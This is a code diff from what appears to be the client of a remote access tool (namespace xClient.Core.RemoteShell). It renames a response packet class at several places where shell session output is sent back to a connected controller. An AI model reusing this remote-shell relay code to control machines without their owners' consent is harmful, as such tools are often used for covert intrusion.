@@ -42,7 +42,7 @@ namespace xClient.Core.RemoteShell
 
             Thread.Sleep(100);
 
-            new Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(
+            new Packets.ClientPackets.DoShellExecuteResponse(">> New Session created" + Environment.NewLine).Execute(
                 Program.ConnectClient);
         }
 
@@ -90,7 +90,7 @@ namespace xClient.Core.RemoteShell
                         if (!string.IsNullOrEmpty(read))
                         {
                             Thread.Sleep(200);
-                            new Packets.ClientPackets.ShellCommandResponse(read + Environment.NewLine).Execute(
+                            new Packets.ClientPackets.DoShellExecuteResponse(read + Environment.NewLine).Execute(
                                 Program.ConnectClient);
                         }
 
@@ -109,7 +109,7 @@ namespace xClient.Core.RemoteShell
             {
                 if (ex is ApplicationException || ex is InvalidOperationException)
                 {
-                    new Packets.ClientPackets.ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
+                    new Packets.ClientPackets.DoShellExecuteResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
                         .Execute(Program.ConnectClient);
 
                     CreateSession();
@@ -137,7 +137,7 @@ namespace xClient.Core.RemoteShell
                         if (!string.IsNullOrEmpty(read))
                         {
                             Thread.Sleep(200);
-                            new Packets.ClientPackets.ShellCommandResponse(read + Environment.NewLine, true).Execute(
+                            new Packets.ClientPackets.DoShellExecuteResponse(read + Environment.NewLine, true).Execute(
                                 Program.ConnectClient);
                         }
 
@@ -156,7 +156,7 @@ namespace xClient.Core.RemoteShell
             {
                 if (ex is ApplicationException || ex is InvalidOperationException)
                 {
-                    new Packets.ClientPackets.ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
+                    new Packets.ClientPackets.DoShellExecuteResponse(">> Session unexpectedly closed" + Environment.NewLine, true)
                         .Execute(Program.ConnectClient);
 
                     CreateSession();
